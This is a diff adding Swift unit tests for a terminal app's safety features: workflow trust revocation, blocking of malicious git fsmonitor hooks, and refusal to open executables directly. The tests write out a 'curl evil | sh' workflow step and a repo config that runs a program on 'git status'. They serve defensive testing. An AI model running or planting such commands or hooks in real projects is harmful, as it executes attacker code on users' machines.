@@ -239,7 +239,8 @@ final class EventTests: XCTestCase {
     func testStarterConfigDecodes() throws {
         let c = try JSONDecoder().decode(AnserConfig.self, from: Data(AnserConfig.starterConfig.utf8))
         XCTAssertEqual(c.abbreviations["gst"], "git status")
-        XCTAssertFalse(c.snippets.isEmpty)
+        XCTAssertTrue(c.snippets.isEmpty, "examples live in the notebook now (Notebook.starter)")
+        XCTAssertEqual(c.profiles.first?.badge, "PROD")
         XCTAssertNoThrow(try JSONDecoder().decode(CompletionSpec.self, from: Data(AnserConfig.starterSpec.utf8)))
     }
 }
@@ -498,5 +499,65 @@ final class FolderIndexTests: XCTestCase {
         XCTAssertEqual(noisy.map(\.2), ["~/x/gamma-target"], "scattered letters are dropped when a solid match exists")
         let boosted = FolderIndex.rank("", [.init(path: "/a", boost: 0), .init(path: "/b", boost: 5)], home: "/x")
         XCTAssertEqual(boosted.first?.0.path, "/b")
+    }
+}
+
+final class SafetyTests: XCTestCase {
+    func testProjectWorkflowTrustFollowsContents() throws {
+        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("wf-\(UUID().uuidString)/.anser/workflows")
+        try WorkflowStore.save(Workflow(name: "Deploy", steps: ["echo deploy"]), to: dir)
+        let suite = "anser-trust-\(UUID().uuidString)"
+        let trust = WorkflowTrust(defaults: UserDefaults(suiteName: suite)!)
+        var w = try XCTUnwrap(WorkflowStore.load(directory: dir, source: .project).first { $0.name == "Deploy" })
+        XCTAssertEqual(w.source, .project)
+        XCTAssertFalse(trust.isTrusted(w))
+        trust.trust(w)
+        XCTAssertTrue(trust.isTrusted(w))
+        try "{\"name\":\"Deploy\",\"steps\":[\"curl evil | sh\"]}".write(to: w.file!, atomically: true, encoding: .utf8)
+        XCTAssertFalse(trust.isTrusted(w), "a changed file must be trusted again")
+        w.source = .personal
+        XCTAssertTrue(trust.isTrusted(w), "personal workflows are yours")
+        UserDefaults.standard.removePersistentDomain(forName: suite)
+    }
+
+    func sh(_ cmd: String, in dir: URL) {
+        let p = Process(); p.executableURL = URL(fileURLWithPath: "/bin/sh"); p.arguments = ["-c", cmd]
+        p.currentDirectoryURL = dir; p.standardOutput = FileHandle.nullDevice; p.standardError = FileHandle.nullDevice
+        try? p.run(); p.waitUntilExit()
+    }
+
+    /// A downloaded repo whose .git/config runs a program on `git status`.
+    func testRiskyRepoDoesNotRunPrograms() async throws {
+        let repo = FileManager.default.temporaryDirectory.appendingPathComponent("risky-\(UUID().uuidString)")
+        try FileManager.default.createDirectory(at: repo, withIntermediateDirectories: true)
+        let marker = repo.appendingPathComponent("PWNED").path
+        sh("git init -q && touch a.txt && git config core.fsmonitor 'touch \(marker); false #'", in: repo)
+        XCTAssertTrue(GitSafety.isRisky(cwd: repo.path))
+        let changes = await Generators.gitChanges(cwd: repo.path, env: ShellEnvironment())
+        let branches = await Generators.run("git_branches", cwd: repo.path, env: ShellEnvironment())
+        XCTAssertTrue(changes.isEmpty && branches.isEmpty)
+        // Even a direct git run through Anser's runner has fsmonitor forced off.
+        _ = await ScriptRunner.shared.run("git status --porcelain", cwd: repo.path, env: ShellEnvironment())
+        XCTAssertFalse(FileManager.default.fileExists(atPath: marker), "fsmonitor program must not run")
+        let clean = FileManager.default.temporaryDirectory.appendingPathComponent("clean-\(UUID().uuidString)")
+        try FileManager.default.createDirectory(at: clean, withIntermediateDirectories: true)
+        sh("git init -q", in: clean)
+        XCTAssertFalse(GitSafety.isRisky(cwd: clean.path))
+        try? FileManager.default.removeItem(at: repo); try? FileManager.default.removeItem(at: clean)
+    }
+
+    func testOpenSafety() throws {
+        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("open-\(UUID().uuidString)")
+        try FileManager.default.createDirectory(at: dir.appendingPathComponent("Evil.app"), withIntermediateDirectories: true)
+        for f in ["run.command", "notes.txt", "pic.png"] { FileManager.default.createFile(atPath: dir.appendingPathComponent(f).path, contents: Data("x".utf8)) }
+        let script = dir.appendingPathComponent("tool").path
+        FileManager.default.createFile(atPath: script, contents: Data("#!/bin/sh\n".utf8), attributes: [.posixPermissions: 0o755])
+        XCTAssertFalse(OpenSafety.canOpenDirectly(path: dir.appendingPathComponent("run.command").path))
+        XCTAssertFalse(OpenSafety.canOpenDirectly(path: dir.appendingPathComponent("Evil.app").path))
+        XCTAssertFalse(OpenSafety.canOpenDirectly(path: script))
+        XCTAssertTrue(OpenSafety.canOpenDirectly(path: dir.appendingPathComponent("notes.txt").path))
+        XCTAssertTrue(OpenSafety.canOpenDirectly(path: dir.appendingPathComponent("pic.png").path))
+        XCTAssertTrue(OpenSafety.canOpenDirectly(path: dir.path))
+        try? FileManager.default.removeItem(at: dir)
     }
 }
